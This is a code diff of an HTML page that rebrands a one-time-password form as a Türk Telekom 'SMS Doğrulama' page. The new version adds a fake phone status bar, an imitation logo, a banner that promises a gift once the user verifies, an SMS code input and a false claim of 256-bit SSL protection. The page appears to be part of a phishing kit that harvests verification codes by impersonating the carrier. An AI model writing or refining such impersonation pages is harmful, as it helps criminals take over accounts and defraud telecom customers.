@@ -4,54 +4,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kolay Giriş - OTP</title>
+    <title>Türk Telekom - Doğrulama</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 
 <body>
     <div class="page-wrapper">
-        <!-- Top blue gradient area -->
-        <div class="top-section"></div>
-
-        <!-- OTP card -->
-        <div class="login-card">
-            <div class="card-header">
-                <h1 class="title">
-                    <span class="arrow">»</span>Kolay Giriş
-                </h1>
-                <div class="divider"></div>
+        <!-- Status bar -->
+        <div class="status-bar">
+            <div class="status-badge">
+                <span class="status-dot"></span>
+                4.5G
             </div>
-
-            <div class="card-body">
-                <div class="otp-info">
-                    <h2 class="otp-title">Türk Telekom<br>Kolay Giriş</h2>
-                    <p class="otp-description">
-                        Lütfen cep telefonunuza gönderilen
-                        <strong id="refCode">D0HWF</strong> referans kodlu şifreyi giriniz.
-                    </p>
-                </div>
-
-                <div class="otp-input-row">
-                    <div class="otp-input-group">
-                        <input type="password" id="otpInput" class="otp-field" placeholder="Şifre" maxlength="4"
-                            autocomplete="one-time-code">
-                    </div>
-                    <div class="otp-timer-box" id="timerBox">
-                        <span id="timerDisplay">1:27 DK</span>
-                    </div>
-                </div>
-
-                <button type="button" class="login-btn" id="submitBtn">
-                    Devam Et
-                </button>
+            <div class="status-icons">
+                <span>📶</span>
+                <span>🔋</span>
             </div>
         </div>
 
-        <!-- Footer links -->
-        <div class="footer-links">
-            <a href="#" class="footer-link">Aydınlatma Metni</a>
-            <a href="#" class="footer-link">Çerez Politikası</a>
+        <!-- Logo -->
+        <div class="logo-area">
+            <div class="tt-logo">
+                <svg viewBox="0 0 70 60" fill="none">
+                    <polygon points="10,30 30,10 30,50" fill="#0066ff" />
+                    <polygon points="25,30 45,10 45,50" fill="#00c8ff" />
+                    <polygon points="40,30 60,10 60,50" fill="#00e6a0" />
+                    <polygon points="30,22 38,30 30,38" fill="#ff4466" />
+                </svg>
+            </div>
+            <div class="logo-text">TÜRK TELEKOM</div>
+        </div>
+
+        <!-- Campaign banner -->
+        <div class="campaign-banner">
+            <div class="campaign-icon">🔐</div>
+            <div>
+                <div class="campaign-title">SMS Doğrulama</div>
+                <div class="campaign-subtitle">Hediyenizi almak için doğrulayın</div>
+            </div>
+        </div>
+
+        <!-- OTP section -->
+        <div class="otp-section">
+            <div class="otp-heading">DOĞRULAMA KODU</div>
+            <p class="otp-message">
+                Cep telefonunuza gönderilen <strong id="refCode">D0HWF</strong> referans kodlu şifreyi giriniz.
+            </p>
+
+            <div class="otp-row">
+                <input type="password" id="otpInput" class="otp-input-dark" placeholder="Şifre" maxlength="4"
+                    autocomplete="one-time-code">
+                <div class="otp-timer" id="timerBox">
+                    <span id="timerDisplay">1:27 DK</span>
+                </div>
+            </div>
+
+            <div class="form-hint" style="justify-content:center; margin-bottom:24px;">
+                <span class="hint-icon">i</span>
+                SMS ile gelen şifreyi giriniz
+            </div>
+        </div>
+
+        <!-- Action button -->
+        <button type="button" class="action-btn" id="submitBtn">
+            <span class="btn-icon">✓</span>
+            Devam Et
+        </button>
+
+        <!-- SSL info -->
+        <div class="ssl-info">
+            <span class="ssl-icon">🛡️</span>
+            Bilgileriniz 256-bit SSL şifrelemesiyle korunmaktadır
+        </div>
+
+        <!-- Footer -->
+        <div class="dark-footer">
+            © 2026 Türk Telekom A.Ş. Tüm hakları saklıdır.
         </div>
     </div>
 
